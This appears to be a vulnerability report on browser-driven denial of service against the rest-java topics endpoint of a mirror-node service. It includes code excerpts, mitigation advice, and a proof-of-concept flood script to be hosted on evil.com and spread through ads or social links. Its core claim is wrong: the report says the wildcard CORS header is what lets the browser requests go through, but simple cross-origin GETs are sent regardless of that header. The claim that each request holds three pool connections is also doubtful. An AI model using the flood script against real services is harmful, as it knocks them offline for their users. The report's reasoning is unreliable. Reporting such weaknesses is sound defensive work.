### Title
Browser-Amplified DoS via Wildcard CORS and Absent Rate Limiting on `GET /api/v1/topics/{id}`

### Summary
The REST-Java service configures `allowedOrigins("*")` for all `/api/**` routes, enabling any browser from any origin to make cross-origin requests to `GET /api/v1/topics/{id}`. Unlike the `web3` module, the `rest-java` module has no rate-limiting layer. Each request triggers three synchronous database queries through a finite HikariCP connection pool, making it possible for an attacker to exhaust the pool by driving browser clients to a malicious page, with the impact amplified during a network partition where DB connections are held open longer awaiting timeouts.

### Finding Description

**CORS configuration** — `rest-java/src/main/java/org/hiero/mirror/restjava/controller/GenericControllerAdvice.java`, lines 68–77:
```java
@Bean
@SuppressWarnings("java:S5122")
WebMvcConfigurer corsConfigurer() {
    return new WebMvcConfigurer() {
        @Override
        public void addCorsMappings(CorsRegistry registry) {
            registry.addMapping("/api/**").allowedOrigins("*");
        }
    };
}
```
The `@SuppressWarnings("java:S5122")` suppresses the Sonar warning about unsafe CORS, confirming this is intentional. The wildcard means the browser's same-origin policy does not block cross-origin `GET` requests from any attacker-controlled page.

**Controller — three DB calls per request** — `rest-java/src/main/java/org/hiero/mirror/restjava/controller/TopicController.java`, lines 31–37:
```java
@GetMapping(value = "/{id}")
Topic getTopic(@PathVariable EntityIdNumParameter id) {
    var topic = topicService.findById(id.id());       // DB call 1
    var entity = entityService.findById(id.id());     // DB call 2
    var customFee = customFeeService.findById(id.id()); // DB call 3
    return topicMapper.map(customFee, entity, topic);
}
```

**Service — direct blocking DB query, no guard** — `rest-java/src/main/java/org/hiero/mirror/restjava/service/TopicServiceImpl.java`, lines 19–21:
```java
public Topic findById(EntityId id) {
    return topicRepository.findById(id.getId())
        .orElseThrow(() -> new EntityNotFoundException("Topic not found"));
}
```

**No rate limiting in rest-java** — The `web3` module has `ThrottleConfiguration` / `ThrottleManagerImpl` with bucket4j rate limiting. The `rest-java` module has no equivalent. The only filters present are `LoggingFilter` (logging only) and `MetricsFilter` (metrics only). `ShallowEtagHeaderFilter` can short-circuit responses for repeat identical requests but does not prevent the initial DB hit or requests with varying IDs.

**Network partition amplification** — During a network partition, `topicRepository.findById()` blocks a HikariCP connection until `hiero.mirror.restJava.db.statementTimeout` (default 10 000 ms) elapses. Concurrent flood requests hold connections for the full timeout window, exhausting the pool far faster than under normal conditions.

### Impact Explanation
HikariCP's default pool size is 10 connections. With three DB calls per request and a 10-second statement timeout during a partition, a modest number of concurrent browser clients can hold all connections simultaneously. Once the pool is exhausted, every subsequent request to any rest-java endpoint (not just topics) blocks waiting for a connection, resulting in full service unavailability. The Grafana alert `RestJavaHighDBConnections` (fires at 75% utilization) confirms this is a recognized operational risk.

### Likelihood Explanation
The attack requires no credentials, no special tooling, and no knowledge of internal infrastructure — only the public API URL. An attacker hosts a page with a JavaScript loop calling `fetch('https://<mirror-node>/api/v1/topics/1')`. Any visitor to that page becomes an unwitting participant. The wildcard CORS header causes the browser to include the response, confirming success and allowing the script to continue. The attack is repeatable, scalable via ad networks or social engineering, and requires no server-side infrastructure beyond a static web page.

### Recommendation
1. **Add rate limiting to rest-java**: Port the bucket4j `ThrottleConfiguration` pattern from `web3` to `rest-java`, applying a per-IP or global requests-per-second limit on `/api/**` routes via a `HandlerInterceptor` or `OncePerRequestFilter`.
2. **Restrict CORS origins**: Replace `allowedOrigins("*")` with an explicit allowlist of trusted origins if the API is not intended for arbitrary third-party browser consumption.
3. **Reduce DB calls per request**: Consolidate the three sequential `findById` calls in `TopicController.getTopic()` into a single query or use a join to reduce connection hold time.
4. **Set HikariCP connection timeout aggressively**: Ensure `spring.datasource.hikari.connectionTimeout` is low enough to fail fast under pool exhaustion rather than queuing indefinitely.
5. **Enforce Traefik rate limiting**: Add a `rateLimit` middleware to the Traefik ingress configuration for the topics path alongside the existing circuit breaker.

### Proof of Concept
```html
<!-- hosted on attacker-controlled evil.com -->
<script>
async function flood() {
  while (true) {
    // Wildcard CORS allows this cross-origin fetch from any origin
    await Promise.all(
      Array.from({length: 50}, (_, i) =>
        fetch('https://mirror-node.example.com/api/v1/topics/' + (i + 1))
          .catch(() => {})
      )
    );
  }
}
flood();
</script>
```
**Steps:**
1. Deploy the above page to any public host.
2. Drive browser traffic to it (social media link, ad, etc.).
3. Each visitor's browser sends 50 concurrent cross-origin GET requests per iteration; the `Access-Control-Allow-Origin: *` response header causes the browser to complete (not block) each request, allowing the loop to continue.
4. Each request acquires up to 3 HikariCP connections for up to 10 seconds (under partition).
5. With ~4 concurrent browser tabs, the default 10-connection pool is saturated; all rest-java endpoints return errors or hang. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)
